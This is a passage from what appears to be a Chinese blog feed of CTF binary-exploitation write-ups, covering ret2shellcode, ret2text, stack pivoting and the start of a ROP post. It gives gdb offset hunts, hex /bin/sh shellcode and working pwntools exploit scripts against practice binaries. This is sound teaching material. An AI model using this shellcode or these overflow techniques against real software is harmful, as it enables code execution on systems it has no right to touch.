+<h1 id="2-漏洞定位及分析"><a href="#2-漏洞定位及分析" class="headerlink" title="2.漏洞定位及分析"></a>2.漏洞定位及分析</h1><p>由上图可知，可以覆盖的空间大小为0x40，buf大小为0x10.</p>
+<p>题目没有发现system函数与“/bin/sh”字符串，且没有开启堆栈不可执行的保护，因此我们可以采用直接写入shellcode的方法。</p>
+<p>由于：</p>
+<p><img src="https://i.loli.net/2019/10/19/dEXrVq4g51oFlQy.png" alt="r2sc3.png"></p>
+<p>我们平常所用的shellcode长度太长，需要更换短一点的shellcode。</p>
+<p>下面是两个可以去搜寻shllcode的网址：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://www.exploit-db.com/shellcodes</span><br><span class="line">http://shell-storm.org/shellcode/</span><br></pre></td></tr></table></figure>
+
+<p>本题用的shellcode是这里找到的：<a href="https://www.exploit-db.com/shellcodes/46907" target="_blank" rel="noopener">https://www.exploit-db.com/shellcodes/46907</a></p>
+<p>shellcode=”\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05”</p>
+<p>接下来应该考虑的是要把shellcode放在那个位置，如果按劫持栈指针的方法，把因为空间不大，可以把shellcoe放在最开头，然后控制程序流跳转执行shellcode。但是本题不可以。原因如下图：</p>
+<p><img src="https://i.loli.net/2019/10/19/bytknArZ6NFRPoC.png" alt="r2sc4.png"></p>
+<p>leave的作用相当于<strong>MOV SP,BP；POP BP。</strong></p>
+<p><img src="https://i.loli.net/2019/10/19/CUEpA9HV4fqlhrN.png" alt="r2sc6.png"></p>
+<p>而shellcode中对sp进行了push操作，所以leave指令会对shellcode的执行造成影响。所以buf中不能存放shellcode，buf后的8个字节也不能存放（这里需要存放返回地址）。</p>
+<p>所以，我们的shellcode只能放在buf首地址后的0x10+8后的地址。</p>
+<h1 id="3-利用步骤"><a href="#3-利用步骤" class="headerlink" title="3.利用步骤"></a>3.利用步骤</h1><p>下面是栈溢出的基本套路：</p>
+<h2 id="1-计算偏移量"><a href="#1-计算偏移量" class="headerlink" title="1.计算偏移量"></a><strong>1.计算偏移量</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ pattern create 100</span><br><span class="line">&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&apos;</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/hc/study/pwn/stackoverflow/Ret2shellcode/sniperoj-pwn100-shellcode-x86-64/shellcode </span><br><span class="line">Welcome to Sniperoj!</span><br><span class="line">Do your kown what is it : [0x7fffffffdbb0] ?</span><br><span class="line">Now give me your answer : </span><br><span class="line">AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x0 </span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x7ffff7af4081 (&lt;__GI___libc_read+17&gt;: cmp    rax,0xfffffffffffff000)</span><br><span class="line">RDX: 0x40 (&apos;@&apos;)</span><br><span class="line">RSI: 0x7fffffffdbb0 (&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH&quot;)</span><br><span class="line">RDI: 0x0 </span><br><span class="line">RBP: 0x41412d4141434141 (&apos;AACAA-AA&apos;)</span><br><span class="line">RSP: 0x7fffffffdbc8 (&quot;(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH&quot;)</span><br><span class="line">RIP: 0x555555554852 (&lt;main+130&gt;:    ret)</span><br><span class="line">R8 : 0x7ffff7fdf4c0 (0x00007ffff7fdf4c0)</span><br><span class="line">R9 : 0x0 </span><br><span class="line">R10: 0x3 </span><br><span class="line">R11: 0x246 </span><br><span class="line">R12: 0x5555555546a0 (&lt;_start&gt;:  xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffdca0 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x10203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x555555554847 &lt;main+119&gt;:   call   0x555555554670 &lt;read@plt&gt;</span><br><span class="line">   0x55555555484c &lt;main+124&gt;:   mov    eax,0x0</span><br><span class="line">   0x555555554851 &lt;main+129&gt;:   leave  </span><br><span class="line">=&gt; 0x555555554852 &lt;main+130&gt;:   ret    </span><br><span class="line">   0x555555554853:  nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x55555555485d:  nop    DWORD PTR [rax]</span><br><span class="line">   0x555555554860 &lt;__libc_csu_init&gt;:    push   r15</span><br><span class="line">   0x555555554862 &lt;__libc_csu_init+2&gt;:  push   r14</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffdbc8 (&quot;(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH&quot;)</span><br><span class="line">0008| 0x7fffffffdbd0 (&quot;A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH&quot;)</span><br><span class="line">0016| 0x7fffffffdbd8 (&quot;AA0AAFAAbAA1AAGAAcAA2AAH&quot;)</span><br><span class="line">0024| 0x7fffffffdbe0 (&quot;bAA1AAGAAcAA2AAH&quot;)</span><br><span class="line">0032| 0x7fffffffdbe8 (&quot;AcAA2AAH&quot;)</span><br><span class="line">0040| 0x7fffffffdbf0 --&gt; 0x0 </span><br><span class="line">0048| 0x7fffffffdbf8 --&gt; 0x7f5085ea1bc1eb88 </span><br><span class="line">0056| 0x7fffffffdc00 --&gt; 0x5555555546a0 (&lt;_start&gt;:  xor    ebp,ebp)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x0000555555554852 in main ()</span><br><span class="line">gdb-peda$ pattern offset (AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH</span><br><span class="line">(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH found at offset: 24</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-编写exp"><a href="#2-编写exp" class="headerlink" title="2.编写exp"></a><strong>2.编写exp</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./shellcode&apos;)</span><br><span class="line"></span><br><span class="line">shellcode = &apos;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&apos;</span><br><span class="line">p.recvuntil(&apos;[&apos;)</span><br><span class="line">buf_addr = p.recvuntil(&apos;]&apos;,drop=True)</span><br><span class="line">p.recv()</span><br><span class="line">#print type(buf_addr)</span><br><span class="line"></span><br><span class="line">payload = &apos;A&apos;*24 + p64(int(buf_addr,16) + 32) + shellcode</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/10/19/C3zki5AwZ4hNB2E.png" alt="r2sc5.png"></p>
+]]></content>
+      <categories>
+        <category>Linux pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>basic_rop</tag>
+        <tag>ret2shellcode</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bamboofox-ret2text</title>
+    <url>/2019/10/19/bamboofox-ret2text/</url>
+    <content><![CDATA[<p>题目地址：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2text/bamboofox-ret2text" target="_blank" rel="noopener">bamboofox-ret2text</a></p>
+<a id="more"></a>
+
+<h1 id="1-基本信息收集"><a href="#1-基本信息收集" class="headerlink" title="1.基本信息收集"></a>1.基本信息收集</h1><h2 id="首先查看文件信息："><a href="#首先查看文件信息：" class="headerlink" title="首先查看文件信息："></a>首先查看文件信息：</h2><p><img src="https://i.loli.net/2019/10/19/OkyKtGN84B6MhPH.png" alt="bam1.png"></p>
+<h2 id="查看保护："><a href="#查看保护：" class="headerlink" title="查看保护："></a>查看保护：</h2><p><img src="https://i.loli.net/2019/10/19/wXnOJLyzR2Y5Ekv.png" alt="bam2.png"></p>
+<h2 id="ida查看反汇编："><a href="#ida查看反汇编：" class="headerlink" title="ida查看反汇编："></a>ida查看反汇编：</h2><p><img src="https://i.loli.net/2019/10/19/ACEeaFkTj743cJX.png" alt="bam3.png"></p>
+<p><img src="https://i.loli.net/2019/10/19/WABDO67fljwcIb5.png" alt="bam4.png"></p>
+<p>发现有栈溢出漏洞，且存在system函数。</p>
+<h1 id="采用基本ROP的ret2text"><a href="#采用基本ROP的ret2text" class="headerlink" title="采用基本ROP的ret2text"></a><strong>采用基本ROP的ret2text</strong></h1><h2 id="1-计算偏移量"><a href="#1-计算偏移量" class="headerlink" title="1.计算偏移量"></a><strong>1.计算偏移量</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ pattern create 200</span><br><span class="line">&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&apos;</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/hc/study/pwn/stackoverflow/Ret2text/bamboofox-ret2text/ret2text </span><br><span class="line">There is something amazing here, do you know anything?</span><br><span class="line">AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br><span class="line">Maybe I will tell you next time !</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0x21 (&apos;!&apos;)</span><br><span class="line">EDX: 0xf7fb5890 --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fb4000 --&gt; 0x1d4d6c </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0x6941414d (&apos;MAAi&apos;)</span><br><span class="line">ESP: 0xffffce30 (&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)</span><br><span class="line">EIP: 0x41384141 (&apos;AA8A&apos;)</span><br><span class="line">EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid $PC address: 0x41384141</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffce30 (&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)</span><br><span class="line">0004| 0xffffce34 (&quot;jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)</span><br><span class="line">0008| 0xffffce38 (&quot;AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)</span><br><span class="line">0012| 0xffffce3c (&quot;AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)</span><br><span class="line">0016| 0xffffce40 (&quot;PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)</span><br><span class="line">0020| 0xffffce44 (&quot;AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)</span><br><span class="line">0024| 0xffffce48 (&quot;AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)</span><br><span class="line">0028| 0xffffce4c (&quot;RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41384141 in ?? ()</span><br><span class="line">gdb-peda$ pattern search</span><br><span class="line">Registers contain pattern buffer:</span><br><span class="line">EBP+0 found at offset: 108</span><br><span class="line">EIP+0 found at offset: 112</span><br><span class="line">Registers point to pattern buffer:</span><br><span class="line">[ESP] --&gt; offset 116 - size ~84</span><br><span class="line">Pattern buffer found at:</span><br><span class="line">0x0804b160 : offset    0 - size  200 ([heap])</span><br><span class="line">0xffffcdbc : offset    0 - size  200 ($sp + -0x74 [-29 dwords])</span><br><span class="line">References to pattern buffer found at:</span><br><span class="line">0xf7fb45cc : 0x0804b160 (/lib32/libc-2.27.so)</span><br><span class="line">0xf7fb45d0 : 0x0804b160 (/lib32/libc-2.27.so)</span><br><span class="line">0xf7fb45d4 : 0x0804b160 (/lib32/libc-2.27.so)</span><br><span class="line">0xf7fb45d8 : 0x0804b160 (/lib32/libc-2.27.so)</span><br><span class="line">0xf7fb45dc : 0x0804b160 (/lib32/libc-2.27.so)</span><br><span class="line">0xffffcd04 : 0x0804b160 ($sp + -0x12c [-75 dwords])</span><br><span class="line">0xffffcd90 : 0xffffcdbc ($sp + -0xa0 [-40 dwords])</span><br></pre></td></tr></table></figure>
+
+<p>得到112</p>
+<h2 id="2-查看system函数地址："><a href="#2-查看system函数地址：" class="headerlink" title="2.查看system函数地址："></a><strong>2.查看system函数地址：</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ disas secure</span><br><span class="line">Dump of assembler code for function secure:</span><br><span class="line">   0x080485fd &lt;+0&gt;: push   ebp</span><br><span class="line">   0x080485fe &lt;+1&gt;: mov    ebp,esp</span><br><span class="line">   0x08048600 &lt;+3&gt;: sub    esp,0x28</span><br><span class="line">   0x08048603 &lt;+6&gt;: mov    DWORD PTR [esp],0x0</span><br><span class="line">   0x0804860a &lt;+13&gt;:    call   0x8048470 &lt;time@plt&gt;</span><br><span class="line">   0x0804860f &lt;+18&gt;:    mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048612 &lt;+21&gt;:    call   0x80484b0 &lt;srand@plt&gt;</span><br><span class="line">   0x08048617 &lt;+26&gt;:    call   0x80484e0 &lt;rand@plt&gt;</span><br><span class="line">   0x0804861c &lt;+31&gt;:    mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line">   0x0804861f &lt;+34&gt;:    lea    eax,[ebp-0x10]</span><br><span class="line">   0x08048622 &lt;+37&gt;:    mov    DWORD PTR [esp+0x4],eax</span><br><span class="line">   0x08048626 &lt;+41&gt;:    mov    DWORD PTR [esp],0x8048760</span><br><span class="line">   0x0804862d &lt;+48&gt;:    call   0x80484f0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x08048632 &lt;+53&gt;:    mov    eax,DWORD PTR [ebp-0x10]</span><br><span class="line">   0x08048635 &lt;+56&gt;:    cmp    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x08048638 &lt;+59&gt;:    jne    0x8048646 &lt;secure+73&gt;</span><br><span class="line">   0x0804863a &lt;+61&gt;:    mov    DWORD PTR [esp],0x8048763</span><br><span class="line">   0x08048641 &lt;+68&gt;:    call   0x8048490 &lt;system@plt&gt;</span><br><span class="line">   0x08048646 &lt;+73&gt;:    leave  </span><br><span class="line">   0x08048647 &lt;+74&gt;:    ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<p>这里注意地址要为call system的上一个地址，因为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/s 0x8048763</span><br><span class="line">0x8048763:  &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure>
+
+<p>要先把/bin/sh字符串传入函数。</p>
+<p>sys_addr =   0x0804863a</p>
+<h2 id="3-编写exp"><a href="#3-编写exp" class="headerlink" title="3.编写exp"></a><strong>3.编写exp</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./ret2text&apos;)</span><br><span class="line"></span><br><span class="line">sys_addr = 0x0804863a</span><br><span class="line">payload = &apos;A&apos;*112 + p32(sys_addr)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/10/19/6qe7kpEOylm2oSa.png" alt="bam5.png"></p>
+]]></content>
+      <categories>
+        <category>Linux pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>basic_rop</tag>
+        <tag>ret2text</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>b0verfl0w_X-CTF Quals 2016</title>
+    <url>/2019/10/16/b0verfl0w-X-CTF-Quals-2016/</url>
+    <content><![CDATA[<p>题目地址：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-%20b0verfl0w" target="_blank" rel="noopener">b0verfl0w</a></p>
+<a id="more"></a>
+
+<h1 id="1-基本信息收集"><a href="#1-基本信息收集" class="headerlink" title="1.基本信息收集"></a>1.基本信息收集</h1><h2 id="1-文件信息"><a href="#1-文件信息" class="headerlink" title="1.文件信息"></a>1.文件信息</h2><p><img src="https://i.loli.net/2019/10/16/JguFUIOkixjbspS.png" alt="sk_pt1.png"></p>
+<h2 id="2-查看保护"><a href="#2-查看保护" class="headerlink" title="2.查看保护"></a>2.查看保护</h2><p><img src="https://i.loli.net/2019/10/16/ydTKs4cStGwpQ2u.png" alt="sk_pt2.png"></p>
+<h2 id="3-IDA查看反汇编代码"><a href="#3-IDA查看反汇编代码" class="headerlink" title="3.IDA查看反汇编代码"></a>3.IDA查看反汇编代码</h2><p><img src="https://i.loli.net/2019/10/16/diAfusySkZ8XQbJ.png" alt="sk_pt3.png"></p>
+<h1 id="2-漏洞定位及利用思路"><a href="#2-漏洞定位及利用思路" class="headerlink" title="2.漏洞定位及利用思路"></a>2.漏洞定位及利用思路</h1><h2 id="Stack-pivot"><a href="#Stack-pivot" class="headerlink" title="Stack pivot"></a>Stack pivot</h2><p>可以看到vul()函数存在栈溢出漏洞，但是很明显我们可以利用的空间并不大，由上图注释，s到bp距离为20字节，而bp占4字节，所以能溢出的栈空间只有50-0x20-4=14字节。所以我们再进行ROP技术就变的困难许多。</p>
+<p>不过我们可以用Stack pivot（劫持栈指针）的方法，下面简单介绍一下，内容摘自ctf-wiki。</p>
+<h3 id="是什么？"><a href="#是什么？" class="headerlink" title="是什么？"></a><strong>是什么？</strong></h3><p>劫持栈指针（Stack pivot）就是改写rsp(esp)，使其指向其他位置。这样栈也就被劫持到攻击者控制的内存上去，然后在该位置做ROP。</p>
+<h3 id="为什么？"><a href="#为什么？" class="headerlink" title="为什么？"></a><strong>为什么？</strong></h3><p>1.可以控制的栈溢出的字节比较少，难以构造较长的ROP链，无法直接利用溢出字节进行ROP</p>
+<p>2.开启了PIE保护，栈地址未知，并且无法泄露，但是利用某些技术（如ret2dl-resolve）时，必须知道栈地址，可以通过stack pivot将栈劫持到相应的区域</p>
+<p>3.其它漏洞难以利用，stack pivot 能够将一些非栈溢出的漏洞，变成栈溢出的漏洞，例如，将程序劫持到堆空间中。</p>
+<h3 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a><strong>利用条件：</strong></h3><p>如果在尝试了直接Rop发现比较难实现，并且程序中有可以利用进行读写的函数，就可以考虑stack pivot</p>
+<p>1.可以控制程序执行流</p>
+<p>2.存在地址已知，内容可控的Buffer<br>        (1) BSS，由于进程按页分配内存，分配给bss段的内存大小至少一个页(4k,0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且bss段分配的内存页拥有读写权限</p>
+<p>​        (2) 堆，但是需要我们能够泄露堆地址</p>
+<p>3.可以控制sp指针，一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是 pop rsp/esp</p>
+<h2 id="再回到题目："><a href="#再回到题目：" class="headerlink" title="再回到题目："></a>再回到题目：</h2><p>由于可以控制的栈溢出的字节比较少，难以构造较长的ROP链，无法直接利用溢出字节进行ROP，但是满足Stack pivot的利用条件，所以本题可以用Stack pivot。</p>
+<p>注意到存在一个hint函数，反汇编查看一下;</p>
+<p><img src="https://i.loli.net/2019/10/16/kwI1Yyvx48fnTD7.jpg" alt="sk_pt4.jpg"></p>
+<p>这是一个很重要的提示，我们稍后会用到。</p>
+<p>接下来按照正常栈溢出的题目的套路来：</p>
+<h1 id="3-利用步骤"><a href="#3-利用步骤" class="headerlink" title="3.利用步骤"></a>3.利用步骤</h1><h2 id="1-找填充值"><a href="#1-找填充值" class="headerlink" title="1.找填充值"></a><strong>1.找填充值</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ pattern create 100 /tmp/input</span><br><span class="line">Writing pattern of 100 chars to filename &quot;/tmp/input&quot;</span><br><span class="line">gdb-peda$ r &lt; /tmp/input</span><br><span class="line">Starting program: /home/hc/study/pwn/stackoverflow/stack pivoting/b0verfl0w &lt; /tmp/input</span><br><span class="line"></span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">Welcome to X-CTF 2016!</span><br><span class="line"></span><br><span class="line">======================</span><br><span class="line">What&apos;s your name?</span><br><span class="line">Hello AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb.</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x1 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xf7fb5890 --&gt; 0x0 </span><br><span class="line">EDX: 0x0 </span><br><span class="line">ESI: 0xf7fb4000 --&gt; 0x1d4d6c </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0x41412941 (&apos;A)AA&apos;)</span><br><span class="line">ESP: 0xffffce90 (&quot;AA0AAFAAb&quot;)</span><br><span class="line">EIP: 0x61414145 (&apos;EAAa&apos;)</span><br><span class="line">EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid $PC address: 0x61414145</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffce90 (&quot;AA0AAFAAb&quot;)</span><br><span class="line">0004| 0xffffce94 (&quot;AFAAb&quot;)</span><br><span class="line">0008| 0xffffce98 --&gt; 0x62 (&apos;b&apos;)</span><br><span class="line">0012| 0xffffce9c --&gt; 0xf7df7e81 (&lt;__libc_start_main+241&gt;:   add    esp,0x10)</span><br><span class="line">0016| 0xffffcea0 --&gt; 0x1 </span><br><span class="line">0020| 0xffffcea4 --&gt; 0xffffcf34 --&gt; 0xffffd123 (&quot;/home/hc/study/pwn/stackoverflow/stack pivoting/b0verfl0w&quot;)</span><br><span class="line">0024| 0xffffcea8 --&gt; 0xffffcf3c --&gt; 0xffffd15d (&quot;XDG_SEAT=seat0&quot;)</span><br><span class="line">0028| 0xffffceac --&gt; 0xffffcec4 --&gt; 0x0 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x61414145 in ?? ()</span><br><span class="line">gdb-peda$ pattern search</span><br><span class="line">Registers contain pattern buffer:</span><br><span class="line">EBP+0 found at offset: 32</span><br><span class="line">EIP+0 found at offset: 36</span><br><span class="line">Registers point to pattern buffer:</span><br><span class="line">[ESP] --&gt; offset 40 - size ~9</span><br><span class="line">Pattern buffer found at:</span><br><span class="line">0x0804b166 : offset    0 - size   49 ([heap])</span><br><span class="line">0x0804b570 : offset    0 - size  100 ([heap])</span><br><span class="line">0xffffce68 : offset    0 - size   49 ($sp + -0x28 [-10 dwords])</span><br><span class="line">References to pattern buffer found at:</span><br><span class="line">0xf7fb45cc : 0x0804b570 (/lib32/libc-2.27.so)</span><br><span class="line">0xf7fb45d0 : 0x0804b570 (/lib32/libc-2.27.so)</span><br><span class="line">0xf7fb45d4 : 0x0804b570 (/lib32/libc-2.27.so)</span><br><span class="line">0xf7fb45d8 : 0x0804b570 (/lib32/libc-2.27.so)</span><br><span class="line">0xf7fb45dc : 0x0804b570 (/lib32/libc-2.27.so)</span><br><span class="line">0xffffcd08 : 0x0804b570 ($sp + -0x188 [-98 dwords])</span><br><span class="line">0xffffc984 : 0xffffce68 ($sp + -0x50c [-323 dwords])</span><br><span class="line">0xffffcdac : 0xffffce68 ($sp + -0xe4 [-57 dwords])</span><br><span class="line">0xffffce54 : 0xffffce68 ($sp + -0x3c [-15 dwords])</span><br></pre></td></tr></table></figure>
+
+<p>填充值为36。所以我们需要填充36字节的垃圾值然后跟上要返回的地址(4字节)</p>
+<p>我们的payload可以构造如下：</p>
+<p><img src="https://i.loli.net/2019/10/16/zN6VkZUefGBjIOt.png" alt="sk_pt5.png"></p>
+<p>0x08048504为jmp esp 的gadgets（看前面提到的hint），覆盖了返回地址，当程序执行到ret时，将该地址pop给eip，并且esp会加4指向asm(sub esp,0x28;jmp esp),然后eip执行地址0x08048504上的代码jmp esp，eip又会执行esp指向的sub esp,0x28;jmp esp，完成esp的劫持。正常情况下eip指向的是.text段中的代码，所以需要将sub esp,0x28;jmp esp转化为机器码，这里是十六进制机器码。</p>
+<p>至于为什么是sub 0x28，36byte+4byte=40byte=0x28byte。</p>
+<h2 id="2-编写exp"><a href="#2-编写exp" class="headerlink" title="2.编写exp"></a><strong>2.编写exp</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./b0verfl0w&apos;)</span><br><span class="line"></span><br><span class="line">jmp_esp = 0x08048504</span><br><span class="line">shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span><br><span class="line">payload = shellcode + &apos;A&apos; * (36 - len(shellcode)) + p32(jmp_esp) + asm(&apos;sub esp, 0x28;jmp esp&apos;)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/10/16/GFbUjTdvkaJ6OE8.jpg" alt="sk_pt6.jpg"></p>
+]]></content>
+      <categories>
+        <category>Linux pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>Stack-pivot</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ROP_r0pbaby</title>
+    <url>/2019/09/25/ROP-r0pbaby/</url>
+    <content><![CDATA[<p>学习一波经典的ROP题目。</p>
+<p>题目地址：<a href="https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/babys-first/r0pbaby" target="_blank" rel="noopener">r0pbaby</a></p>
+<a id="more"></a>
+
+<h1 id="1-基本信息收集"><a href="#1-基本信息收集" class="headerlink" title="1.基本信息收集"></a>1.基本信息收集</h1><h2 id="文件信息"><a href="#文件信息" class="headerlink" title="文件信息"></a>文件信息</h2><p><img src="https://i.loli.net/2019/09/25/W7DT6KqYjOziJAX.png" alt="1.png"></p>
+<p>64位的程序</p>
+<h2 id="查看保护："><a href="#查看保护：" class="headerlink" title="查看保护："></a>查看保护：</h2><p><img src="https://i.loli.net/2019/09/25/9EFqd42y5zAiNUe.jpg" alt="2.jpg"></p>
+<p>开启了NX（不可执行）+PIE（Position Independnet Code位置无关代码）等安全防护，对于这样的保护机制，绕过的方法是ROP(Return-oriented Programming)，那ROP是什么？</p>
+<h1 id="2-漏洞定位及利用思路"><a href="#2-漏洞定位及利用思路" class="headerlink" title="2.漏洞定位及利用思路"></a>2.漏洞定位及利用思路</h1><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>ROP的核心思想：攻击者扫描已有的<a href="https://baike.baidu.com/item/动态链接库/100352" target="_blank" rel="noopener">动态链接库</a>和可执行文件，提取出可以利用的指令片段(gadget)，这些指令片段均以ret指令结尾，即用ret指令实现指令片段执行流的衔接。</p>
